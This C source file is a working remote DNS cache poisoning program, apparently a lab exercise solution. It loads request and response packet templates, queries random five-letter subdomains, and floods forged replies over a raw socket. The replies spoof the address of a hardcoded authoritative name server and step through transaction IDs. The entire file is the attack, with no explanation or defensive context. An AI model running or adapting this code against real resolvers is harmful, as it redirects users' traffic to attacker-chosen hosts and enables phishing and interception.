#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000
#define TARGET_NAME_SERVER "199.43.133.53"


/* IP Header */
struct ipheader {
    unsigned char      iph_ihl:4, //IP header length
    iph_ver:4; //IP version
    unsigned char      iph_tos; //Type of service
    unsigned short int iph_len; //IP Packet length (data + header)
    unsigned short int iph_ident; //Identification
    unsigned short int iph_flag:3, //Fragmentation flags
    iph_offset:13; //Flags offset
    unsigned char      iph_ttl; //Time to Live
    unsigned char      iph_protocol; //Protocol type
    unsigned short int iph_chksum; //IP datagram checksum
    struct  in_addr    iph_sourceip; //Source IP address
    struct  in_addr    iph_destip;   //Destination IP address
};

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(unsigned char *packet, int packet_size, char *buff);
void send_dns_response(unsigned char *packet, int packet_size, unsigned char *buff, char *buff2, unsigned short num);

int main()
{
    srand(time(NULL));
    // Load the DNS request packet from file
    FILE * f_req = fopen("dns_req.bin", "rb");
    if (!f_req) {
        perror("Can't open 'dns_request.bin'");
        exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

    // Load the first DNS response packet from file
    FILE * f_resp = fopen("dns_rep.bin", "rb");
    if (!f_resp) {
        perror("Can't open 'dns_response.bin'");
        exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

    char a[26]="abcdefghijklmnopqrstuvwxyz";
    while (1) {
        unsigned short txid = 0;
        char name[5];
        for (int k=0; k<5; k++)  name[k] = a[rand() % 26];
        send_dns_request(ip_req, n_req, name);
        for (int i = 0; i < 500; i++) {
            send_dns_response(ip_resp, n_resp, TARGET_NAME_SERVER, name, txid);
            send_dns_response(ip_resp, n_resp, TARGET_NAME_SERVER, name, txid);

            txid++;
        }

    }
}


// Use for generating and sending fake DNS request
void send_dns_request(unsigned char *packet, int packet_size, char *buff)
{
    memcpy(packet+41, buff, 5);
    send_raw_packet(packet, packet_size);
}


// Use for generating and sending forged DNS response
void send_dns_response(unsigned char *packet, int packet_size, unsigned char *buff, char *buff2, unsigned short num)
{
    int ip = (int)inet_addr(buff);
    memcpy(packet+12, (void*)&ip, 4);
    memcpy(packet+41, buff2, 5);
    memcpy(packet+64, buff2, 5);

    unsigned short transaction_id = htons(num);
    memcpy(packet+28, (void*)&transaction_id, 2);
    send_raw_packet(packet, packet_size);
}

void send_raw_packet(char *buffer, int pkt_size)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
               &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    struct ipheader *ip = (struct ipheader *) buffer;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, buffer, pkt_size, 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}
